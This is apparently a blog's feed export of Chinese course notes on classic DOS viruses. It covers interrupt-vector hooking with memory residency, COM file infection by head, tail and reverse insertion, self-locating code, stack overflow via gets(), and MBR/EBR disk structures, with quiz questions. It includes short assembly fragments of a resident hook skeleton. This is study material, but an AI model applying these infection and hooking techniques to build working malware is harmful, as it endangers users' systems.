start="2"><li>已知软盘上一个扇区的绝对扇区数是X，软盘1道有18个扇区，请问如何获得该扇区的CHS参数？</li></ol><p>参考答案：<img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512091137459.png" alt="image-20210512091137459" /></p><h2 id="病毒的执行机制中断替换"><a class="markdownIt-Anchor" href="#病毒的执行机制中断替换"></a> 病毒的执行机制——中断替换</h2><h3 id="框架"><a class="markdownIt-Anchor" href="#框架"></a> 框架</h3><ol><li>认识中断向量表</li><li>非驻留式的中断向量修改</li><li>驻留式的中断向量修改</li></ol><h3 id="中断向量表"><a class="markdownIt-Anchor" href="#中断向量表"></a> 中断向量表</h3><p>触发中断后，就会去调用中断处理程序</p><p>而找到中断处理程序的入口地址就是通过中断向量表</p><p>中断向量表在内存00：00处，每4个字节为一个项，这个项的索引就是中断向量号，其中高2个字节为段地址，低2个字节为段内偏移</p><p>中断触发指令<code>int xxh</code>，xx就是中断向量号，4*xx就是中断xx的入口地址在中断向量表中的存放位置</p><h3 id="非驻留式中断向量修改"><a class="markdownIt-Anchor" href="#非驻留式中断向量修改"></a> 非驻留式中断向量修改</h3><p>驻留程序：一直在内存中不退出的程序，例如中断处理程序</p><p>我们目的是修改中断处理程序下的入口地址（即修改中断向量表）使其执行病毒程序，但是病毒程序也需要驻留在内存才不会使中断向量表无效</p><p>在非驻留式中断替换中我们在病毒程序调用后恢复中断向量表</p><h4 id="大致思路-2"><a class="markdownIt-Anchor" href="#大致思路-2"></a> 大致思路</h4><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512092456791.png" alt="image-20210512092456791" /></p><h4 id="重点"><a class="markdownIt-Anchor" href="#重点"></a> 重点</h4><p>病毒和中断向量表不在同一个段，因此段寄存器需要根据实际访问情况变化</p><p>跨段跳转的问题：</p><blockquote><p>病毒需要由自己段跳到原中断向量程序所在的段<br />要跨段跳转，就要采用JMP XX:YY的形式<br />但是JMP CX:AX的语法是不支持的<br />即JMP XX:YY的指令不支持两个间接性，XXYY总有一个是立即数，而程序里面Seg和Offset都不是立即数，怎么解决？<br />我们可以先采用两个立即数来确定JMP指令的形式（比如JMP 00:00），然后我们再来定位到JMP指令的机器码，进行按字节的细粒度修改！</p></blockquote><h4 id="程序设计"><a class="markdownIt-Anchor" href="#程序设计"></a> 程序设计</h4><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%B8%AD%E6%96%AD/image-20210512093103505.png" alt="image-20210512093103505" /></p><h3 id="驻留式中断向量更改"><a class="markdownIt-Anchor" href="#驻留式中断向量更改"></a> 驻留式中断向量更改</h3><p>DOS系统自己就提供了中断调用修改中断向量表，因此这里把hook变成内存驻留</p><p>获取中断入口地址的调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov al,16h;al 中断向量号，16h为键盘IO中断号</span><br><span class="line">mov ah,35h;功能号，取中断向量地址</span><br><span class="line">int 21h;es:bx为中断程序入口地址</span><br></pre></td></tr></table></figure><p>设定中断向量的调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dx, offset;ds:dx指出了新的中断入口地址</span><br><span class="line">mov al,16h;这个指出了要设定的中断号</span><br><span class="line">mov ah,25h;功能号，设置中断向量</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure><p>病毒代码程序设计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org0100h</span><br><span class="line">jmp initialize</span><br><span class="line">Hook 驻留代码</span><br><span class="line">----------------</span><br><span class="line">initialize:</span><br><span class="line">;改变原中断的中断向量表项指向Hook</span><br><span class="line">;修改Hook最后一条JMP语句的机器码指向原中断向量程序地址</span><br><span class="line"></span><br><span class="line">mov dx, initialize    ;dx以前内容内存驻留</span><br><span class="line">int 27h    ;返回DOS，结束进程，但不释放驻留内存</span><br></pre></td></tr></table></figure><h3 id="例题-2"><a class="markdownIt-Anchor" href="#例题-2"></a> 例题</h3><ol><li>关于DOS中断和中断型病毒，下列说法不正确的是（       ）<br />A. DOS中断程序的入口地址存放在中断向量表中<br />B. 病毒在修改中断向量表时需要考虑不同段地址的问题<br />C. 10h中断程序的入口段地址存放在 4*10h+2的地方<br />D. 中断型病毒是通过替换原中断处理程序获得执行机会</li></ol><p>参考答案：D</p><p>解析：并不是替换了原中断处理程序，而是修改了中断向量表使其先执行的病毒程序再执行中断处理程序</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;面向文件系统的病毒引导型病毒&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#面向文件系统的病毒引导型病毒&quot;&gt;&lt;/a&gt; 面向文件系统的病毒——引导型病毒&lt;/h2&gt;
&lt;h3 id=&quot;大致思路&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#大致思路&quot;&gt;&lt;/a&gt; 大致思路&lt;/h3&gt;
&lt;p&gt;将病毒放在软盘的引导扇区，并将原来的引导代码放到数据区，在执行完病毒代码后拷贝回原来的引导代码，并将执行权交给引导代码&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_DOS_函数调用</title>
    <link href="https://wsw8.online/archives/9c64c22b.html"/>
    <id>https://wsw8.online/archives/9c64c22b.html</id>
    <published>2021-05-10T07:31:00.000Z</published>
    <updated>2021-05-11T13:48:35.923Z</updated>
    
    <content type="html"><![CDATA[<h2 id="栈"><a class="markdownIt-Anchor" href="#栈"></a> 栈</h2><p>定义：是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等</p><p>特性：先进后出（FILO）</p><p>基本操作：</p><ol><li>PUSH：压栈</li><li>POP：弹栈</li></ol><span id="more"></span><h2 id="函数调用对栈的操作"><a class="markdownIt-Anchor" href="#函数调用对栈的操作"></a> 函数调用对栈的操作</h2><ol><li>把指令寄存器EIP（指向当前CPU将要运行的下一条指令的地址）入栈，作为程序的返回地址（一般用RET）表示</li><li>把基址寄存器EBP入栈（保护数据）</li><li>把EBP设为栈顶指针ESP，作为新的基地址</li><li>动态存储分配留出一定空间，即把ESP减去一个适当的值</li></ol><h3 id="获取参数值"><a class="markdownIt-Anchor" href="#获取参数值"></a> 获取参数值</h3><p>call指令执行完毕的栈布局：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511195956130.png" alt="image-20210511195956130" /></p><p>为了得到参数2，我们使用EBP保存ESP，而为了保护保存ESP的EBP，我们将其入栈，得到如此结构：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511200219660.png" alt="image-20210511200219660" /></p><h3 id="获取局部变量值"><a class="markdownIt-Anchor" href="#获取局部变量值"></a> 获取局部变量值</h3><p>栈分布如图：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511200418376.png" alt="image-20210511200418376" /></p><h3 id="获取返回值"><a class="markdownIt-Anchor" href="#获取返回值"></a> 获取返回值</h3><p>函数返回值通过eax寄存器传递，如果两个返回值还会使用edx：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511200752137.png" alt="image-20210511200752137" /></p><p>如果返回值太大、就需要主调函数在call被调函数之前创建临时空间：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511201041931.png" alt="image-20210511201041931" /></p><p>然后，在被调函数传递返回值时：</p><ol><li>通过[EBP+偏移]获得返回值的存放地址</li><li>把返回值写入到这个内存</li><li>把返回值写入到EAX，<code>mov eax,[ebp+偏移]</code></li></ol><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511201411512.png" alt="image-20210511201411512" /></p><h2 id="函数调用的扫尾工作"><a class="markdownIt-Anchor" href="#函数调用的扫尾工作"></a> 函数调用的扫尾工作</h2><ol><li>平衡栈，清除参数传递消耗的栈空间</li><li>只需要改变esp值就可</li><li>可以由调用函数使用<code>ret 参数占用栈大小</code>来清除</li></ol><h2 id="栈溢出"><a class="markdownIt-Anchor" href="#栈溢出"></a> 栈溢出</h2><p>例如程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>&amp;&amp;name[i];i++)</span><br><span class="line">        <span class="built_in">printf</span>(“%c”,name[i]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>当我们输入的数据大于16个字节时就会产生栈溢出，此时输入的字节会覆盖栈底内容导致出错，这就是栈溢出</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511202236918.png" alt="image-20210511202236918" /></p><h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2><ol><li>关于函数，下列说法不正确的是（       ）<br />A. 被调函数通过EBP+偏移访问主调函数传递的参数<br />B. 被调函数返回后，主调函数不需要再进行清栈的动作<br />C. 被调函数通过寄存器将返回值或返回值地址传递给主调函数<br />D. 被调函数通过EBP-偏移访问自己的局部变量</li></ol><p>参考答案：B</p><p>解析：主调函数是否进行清栈是根据被调函数是否清栈来的，而不是一定不清栈</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;栈&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#栈&quot;&gt;&lt;/a&gt; 栈&lt;/h2&gt;
&lt;p&gt;定义：是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等&lt;/p&gt;
&lt;p&gt;特性：先进后出（FILO）&lt;/p&gt;
&lt;p&gt;基本操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;PUSH：压栈&lt;/li&gt;
&lt;li&gt;POP：弹栈&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_DOS_病毒寄生</title>
    <link href="https://wsw8.online/archives/92e6b388.html"/>
    <id>https://wsw8.online/archives/92e6b388.html</id>
    <published>2021-05-08T12:22:56.000Z</published>
    <updated>2021-05-10T08:30:13.032Z</updated>
    
    <content type="html"><![CDATA[<h2 id="框架"><a class="markdownIt-Anchor" href="#框架"></a> 框架</h2><p>寄生机制</p><blockquote><p>文件型病毒</p><blockquote><p>头插入、尾插入、逆插入</p></blockquote><p>面向文件系统的病毒</p><blockquote><p>引导性病毒</p></blockquote></blockquote><span id="more"></span><p>执行机制</p><blockquote><p>对于com文件，头，尾，逆插入寄生都相当于入口点修改，可以执行</p><p>中断替换</p></blockquote><h2 id="debug使用"><a class="markdownIt-Anchor" href="#debug使用"></a> debug使用</h2><ol><li>-u 反汇编</li><li>-g xxx 运行到xxx中断</li><li>-t 单步</li><li>-r 查看寄存器</li><li>-d 查看内存</li><li>-e 地址 值 修改内存</li><li>-a 地址 添加指令</li></ol><h2 id="病毒的寄生机制"><a class="markdownIt-Anchor" href="#病毒的寄生机制"></a> 病毒的寄生机制</h2><h3 id="头插入"><a class="markdownIt-Anchor" href="#头插入"></a> 头插入</h3><h4 id="dos环境下四种基本可执行文件格式"><a class="markdownIt-Anchor" href="#dos环境下四种基本可执行文件格式"></a> DOS环境下四种基本可执行文件格式</h4><ol><li><p>批处理文件 .bat结尾</p></li><li><p>设备驱动文件 .sys结尾</p></li><li><p>纯代码文件 .com结尾</p><blockquote><p>没有文件头</p><p>缺省从0x100H处开始执行</p><p>没有重定位项</p><p>所有代码和数据控制在64k以内</p></blockquote></li><li><p>EXE文件 .exe结尾</p><blockquote><p>文件以英文字母MZ开头</p><p>有一个文件头，指出每个段定义等信息</p><p>摆脱了代码大小不得超过64k的限制</p></blockquote></li></ol><h4 id="大致思路"><a class="markdownIt-Anchor" href="#大致思路"></a> 大致思路</h4><p>将病毒代码放到正常代码头部合成新的文件</p><h4 id="一些问题"><a class="markdownIt-Anchor" href="#一些问题"></a> 一些问题</h4><ol><li>病毒代码的ret导致直接退出，删掉ret</li><li>删掉ret后执行错误，发现是由于将数据区当指令执行了，利用JMP指令跳过数据区</li><li>正常执行后发现正常代码打印的字符串不对，发现是由于加载偏差，于是在病毒区后面增加代码使其复制正常代码到原来的位置进行覆盖，然后跳转到开始</li><li>在覆盖字符不多的情况下可以正常执行，换作大程序发现程序直接挂掉，发现是由于覆盖的代码将进行覆盖的指令都给覆盖了，于是我们需要保护拷贝指令，将拷贝指令复制到最后面，执行完成后跳转到开始</li></ol><h4 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h4><ol><li>多次利用JMP指令控制指令的执行</li><li>处理预期加载地址与实际加载地址不同的问题，处理覆盖的问题</li><li>利用代码拷贝来创造寄生空间或还原现场</li></ol><h3 id="尾插入"><a class="markdownIt-Anchor" href="#尾插入"></a> 尾插入</h3><h4 id="大致思路-2"><a class="markdownIt-Anchor" href="#大致思路-2"></a> 大致思路</h4><p>用JMP指令覆盖正常程序的前3个字节使其跳转到病毒代码，再将覆盖的代码写到病毒代码的最后，执行完病毒代码后将尾部保存的原字节内容覆盖回去再跳转回去执行就可</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210509192438009.png" alt="image-20210509192438009" /></p><h4 id="自定位代码"><a class="markdownIt-Anchor" href="#自定位代码"></a> 自定位代码</h4><p>但是有一些问题，比如病毒代码的加载偏差，在头插入中我们采用将正常代码拷贝到原来位置来消除加载偏差的，可是如果我们拷贝病毒代码，那就成了头插入了，于是我们要想办法获得加载偏差的值然后在病毒代码中校正，这就是自定位技术（重定位技术）</p><ol><li><p>首先我们想到利用MOV AX，IP来获取IP寄存器的值，可是没有指令有权限访问IP寄存器</p></li><li><p>但是CALL指令很特殊，它会将<strong>下一条</strong>指令的IP压栈后跳转执行，于是我们可以利用这个机制获得加载偏差</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210509194514539.png" alt="image-20210509194514539" /></p></li></ol><h4 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2"></a> 总结</h4><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210509200017110.png" alt="image-20210509200017110" /></p><h3 id="逆差入"><a class="markdownIt-Anchor" href="#逆差入"></a> 逆差入</h3><p>定义：逆插入感染，实际就是一部分代码在原程序的头部，一部分在尾部，将整个原来的程序给包裹起来</p><h4 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h4><p>大致思路：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151224438.png" alt="image-20210510151224438" /></p><p>程序设计：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510152355492.png" alt="image-20210510152355492" /></p><p>感染代码：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510152516043.png" alt="image-20210510152516043" /></p><h4 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h4><ol><li>逆差入需要拷贝多次（normal后移、头粘贴、尾粘贴）</li><li>用到了DOS读写文件的中断调用</li></ol><h4 id="dos下的文件读写"><a class="markdownIt-Anchor" href="#dos下的文件读写"></a> DOS下的文件读写</h4><p>类似C语言的fopen、fread、fwrite、fseek、fclose</p><p>打开文件：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151650600.png" alt="image-20210510151650600" /></p><p>读文件：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151716651.png" alt="image-20210510151716651" /></p><p>关闭文件：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151738657.png" alt="image-20210510151738657" /></p><p>写文件：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151754026.png" alt="image-20210510151754026" /></p><p>移动文件指针：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151818941.png" alt="image-20210510151818941" /></p><blockquote><p>以上代码将文件指针放在尾部，设置移动的偏移量CX：DX为0，就是不移动，那么调用21h后，得到的新偏移量就是文件大小，也就是AX中存放文件大小</p></blockquote><h4 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h4><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510152817598.png" alt="image-20210510152817598" /></p><blockquote><p>应该是从尾至头拷贝，防止覆盖</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;框架&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#框架&quot;&gt;&lt;/a&gt; 框架&lt;/h2&gt;
&lt;p&gt;寄生机制&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;文件型病毒&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;头插入、尾插入、逆插入&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;面向文件系统的病毒&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;引导性病毒&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_基础_硬盘数据结构</title>
    <link href="https://wsw8.online/archives/57883fea.html"/>
    <id>https://wsw8.online/archives/57883fea.html</id>
    <published>2021-05-08T08:31:12.000Z</published>
    <updated>2021-05-10T08:30:44.349Z</updated>
    
    <content type="html"><![CDATA[<h2 id="硬盘分区"><a class="markdownIt-Anchor" href="#硬盘分区"></a> 硬盘分区</h2><h3 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h3><p>建立硬盘数据结构（分区表、扩展分区等）</p><h3 id="执行"><a class="markdownIt-Anchor" href="#执行"></a> 执行</h3><p>分区划分以<strong>柱面</strong>为单位，一个柱面不能属于两个分区</p><span id="more"></span><h2 id="主引导扇区第一个扇区"><a class="markdownIt-Anchor" href="#主引导扇区第一个扇区"></a> 主引导扇区（第一个扇区）</h2><h3 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h3><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508163959563.png" alt="image-20210508163959563" /></p><h3 id="找到分区入口"><a class="markdownIt-Anchor" href="#找到分区入口"></a> 找到分区入口</h3><h4 id="分区表项的内容"><a class="markdownIt-Anchor" href="#分区表项的内容"></a> 分区表项的内容</h4><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508164230521.png" alt="image-20210508164230521" /></p><h4 id="相对扇区数"><a class="markdownIt-Anchor" href="#相对扇区数"></a> 相对扇区数</h4><p>相对于引导记录头部的偏移扇区数</p><h4 id="mbr和ebr"><a class="markdownIt-Anchor" href="#mbr和ebr"></a> MBR和EBR</h4><p>主分区表中的四个分区表项，属于MBR</p><p>扩展分区的分区表项，属于EBR（Extended MBR）</p><blockquote><p>EBR为了兼容MBR，完全复用了MBR的引导扇区格式，但前466个字节为0，后两个分区表项无效，结束标识55AA</p><p>主分区表中最后一个有效主分区记录指向的磁盘空间**（主扩展分区）**将用EBR划分，分为N个逻辑盘，形成EBR链</p><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508165341507.png" alt="image-20210508165341507" /></p></blockquote><h3 id="整个图示"><a class="markdownIt-Anchor" href="#整个图示"></a> 整个图示</h3><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508165548520.png" alt="image-20210508165548520" /></p><h3 id="定位主分区和扩展分区的关键区别"><a class="markdownIt-Anchor" href="#定位主分区和扩展分区的关键区别"></a> 定位主分区和扩展分区的关键区别</h3><p>主分区：</p><ol><li>偏移量是相对物理盘开始（MBR）的偏移，根据偏移得到的就是该分区的引导扇区和文件系统</li></ol><p>扩展分区：</p><ol><li>偏移量是相对于包含该分区的扩展分区开始处（EBR）而言</li></ol><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508170556297.png" alt="image-20210508170556297" /></p><h2 id="硬盘引导过程"><a class="markdownIt-Anchor" href="#硬盘引导过程"></a> 硬盘引导过程</h2><ol><li><p><strong>开机加电自检</strong></p><blockquote><p>开机，CPU跳到FFFF：0000处，由该处的一条JMP指令跳到BIOS的自检程序（POST），自检通过后，加载引导程序（与操作系统无关的MBR，按用户在BIOS中指定顺序，硬盘，软盘，光驱或U盘等）</p></blockquote></li><li><p><strong>读主引导扇区</strong></p><blockquote><p>将主引导扇区MBR读入到内存的0000：7C00，扫描主分区表，搜索激活分区，分区表项第一个字节为0x80表示激活分区</p></blockquote></li><li><p><strong>读激活分区引导扇区</strong></p><blockquote><p>如果有多个激活分区或没有，报错结束。否则读取激活分区引导扇区到0000：7C00</p></blockquote></li><li><p><strong>操作系统引导代码引导系统并读取操作系统初始化文件</strong></p></li></ol><h3 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h3><ol><li>MBR中硬盘数据结构与操作系统无关</li><li>操作系统相关的引导代码在激活分区的引导扇区，而MBR的引导程序选择激活分区</li><li>以上步骤采用的是标准MBR，但硬盘也可以引导多系统，要引导多系统必须用专门的引导程序替换标准MBR，这样替换后的硬盘引导代码执行时可让用户选择启动哪个硬盘分区</li></ol><h3 id="x86实模式寻址"><a class="markdownIt-Anchor" href="#x86实模式寻址"></a> X86实模式寻址</h3><ol><li>一个段64k，2字节表示</li><li>段地址：段内偏移     例如：0001：1234</li><li>省略段地址 相对DS数据段寄存器</li><li>为了方便，CS（指令段）、DS（数据段）、ES（附加段）、SS（栈段）设定为相同段</li><li>指令获取 CS：IP、栈操作 SS：SP</li><li>涉及内存的操作指令中没有段信息用DS</li></ol><h2 id="硬盘逻辑锁"><a class="markdownIt-Anchor" href="#硬盘逻辑锁"></a> 硬盘逻辑锁</h2><p>最后一个分区表项又指向了新的MBR形成一个死锁</p><h3 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h3><ol><li>如何遍历FAT表获得一个文件所占的簇？</li><li>对于一个多层嵌套的文件，如何找到文件所对应的目录项？</li><li>如何找到硬盘的主分区和扩展分区？</li><li>简述硬盘引导的过程？</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;硬盘分区&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#硬盘分区&quot;&gt;&lt;/a&gt; 硬盘分区&lt;/h2&gt;
&lt;h3 id=&quot;作用&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#作用&quot;&gt;&lt;/a&gt; 作用&lt;/h3&gt;
&lt;p&gt;建立硬盘数据结构（分区表、扩展分区等）&lt;/p&gt;
&lt;h3 id=&quot;执行&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#执行&quot;&gt;&lt;/a&gt; 执行&lt;/h3&gt;
&lt;p&gt;分区划分以&lt;strong&gt;柱面&lt;/strong&gt;为单位，一个柱面不能属于两个分区&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>系统结构第三章_流水线</title>
    <link href="https://wsw8.online/archives/ef24c61a.html"/>
    <id>https://wsw8.online/archives/ef24c61a.html</id>
    <published>2021-05-03T08:22:30.000Z</published>
    <updated>2021-05-10T08:27:03.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="流水线的基本概念"><a class="markdownIt-Anchor" href="#流水线的基本概念"></a> 流水线的基本概念</h2><h3 id="1-什么是流水线"><a class="markdownIt-Anchor" href="#1-什么是流水线"></a> 1. 什么是流水线</h3><p>定义：流水线是利用执行指令操作之间的并行性，实现多条指令重叠执行的技术</p><h4 id="11-术语"><a class="markdownIt-Anchor" href="#11-术语"></a> 1.1 术语</h4><p>流水段（流水级）：完成一条指令的一部分操作</p><p>机器周期（流水线周期）：指令沿流水线移动一个流水段的时间。长度取决于最慢的流水段，一般是一个时钟周期（有时是两个时钟周期）。每个流水线周期从指令流水线流出一条指令</p><p>吞吐量：单位时间从流水线流出的指令数</p><span id="more"></span><p>流水线设计者：平衡每个流水段的时间，使之等长。因此，每条指令在流水线的平均执行时间在理想情况下为：非流水线机器平均指令执行时间/流水线机器段数</p><p>流水线加速比：非流水线机器平均指令执行时间/流水线机器平均指令执行时间</p><p>理想情况：流水线加速比=流水线机器段数</p><h4 id="12-特点"><a class="markdownIt-Anchor" href="#12-特点"></a> 1.2 特点</h4><ol><li>类似自动装配线</li><li>有多个段（级），段间有<strong>流水线寄存器</strong></li><li>每个流水段执行指令或操作的<strong>不同部分</strong></li><li>流水段之间采用<strong>同步时钟控制</strong></li><li>流水线是开发串行指令流中<strong>并行性</strong>的一种实现技术</li></ol><h3 id="2-risc指令系统的特点"><a class="markdownIt-Anchor" href="#2-risc指令系统的特点"></a> 2. RISC指令系统的特点</h3><ol><li>所有参加运算的数据来自<strong>寄存器</strong>，结果也写入<strong>寄存器</strong>，寄存器为32/64位</li><li>访存只有<code>load</code>和<code>store</code>指令</li><li>指令的类型较少，所有指令<strong>长度相同</strong></li><li>不同指令执行的时钟周期数差别不大</li></ol><h3 id="3-非流水线方式下risc指令系统的实现"><a class="markdownIt-Anchor" href="#3-非流水线方式下risc指令系统的实现"></a> 3. 非流水线方式下RISC指令系统的实现</h3><h4 id="31-多周期cpu实现"><a class="markdownIt-Anchor" href="#31-多周期cpu实现"></a> 3.1 多周期CPU实现</h4><p>假定指令系统是MIPS的一个定点子集：load/store指令，ALU指令，转移指令</p><p>一条指令的执行过程最多需要5个时钟周期：CPI=5</p><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504195556778.png" 